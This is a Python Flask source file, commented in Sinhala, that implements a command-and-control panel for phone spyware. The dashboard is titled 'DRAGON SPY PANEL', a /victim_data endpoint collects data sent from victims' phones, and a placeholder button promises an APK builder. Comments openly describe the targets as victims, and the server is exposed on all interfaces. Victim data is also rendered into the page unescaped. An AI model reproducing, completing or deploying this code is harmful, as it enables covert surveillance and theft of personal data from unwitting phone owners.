from flask import Flask, render_template_string, request

app = Flask(__name__)

# මෙතන තමයි වික්ටිම්ගෙන් එන දත්ත තාවකාලිකව තියාගන්නේ
logs = []

@app.route('/')
def home():
    log_html = "".join([f"<li>{l}</li>" for l in logs]) if logs else "<li>No data yet...</li>"
    return f'''
    <html>
        <head>
            <title>Pro Spy Dashboard</title>
            <meta http-equiv="refresh" content="5"> </head>
        <body style="background-color: #121212; color: #e0e0e0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 20px;">
            <h1 style="color: #00ff00; text-shadow: 0 0 10px #00ff00;">🐉 DRAGON SPY PANEL 🐉</h1>
            <div style="display: flex; justify-content: space-around; margin-top: 20px;">
                <div style="background: #1e1e1e; padding: 20px; border-radius: 10px; border: 1px solid #333; width: 40%;">
                    <h3>Server Status</h3>
                    <p style="color: #00ff00;">● Online</p>
                    <p>Connected Devices: <b>{len(logs)}</b></p>
                </div>
                <div style="background: #1e1e1e; padding: 20px; border-radius: 10px; border: 1px solid #333; width: 50%;">
                    <h3>Live Logs</h3>
                    <ul style="list-style: none; padding: 0; text-align: left; color: #00ccff;">
                        {log_html}
                    </ul>
                </div>
            </div>
            <br>
            <button onclick="alert('APK Builder Coming Soon!')" style="padding: 15px 30px; background: #cf0000; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold;">BUILD NEW APK</button>
        </body>
    </html>
    '''

# මේක තමයි වික්ටිම්ගේ ෆෝන් එකෙන් දත්ත එවන පාර (Endpoint එක)
@app.route('/victim_data')
def get_data():
    data = request.args.get('info')
    if data:
        logs.append(data)
        return "Success"
    return "No info"

if __name__ == '__main__':
    app.run(port=5000, host='0.0.0.0') # host='0.0.0.0' දැම්මම ලෝකෙටම පේන්න හදන්න ලේසියි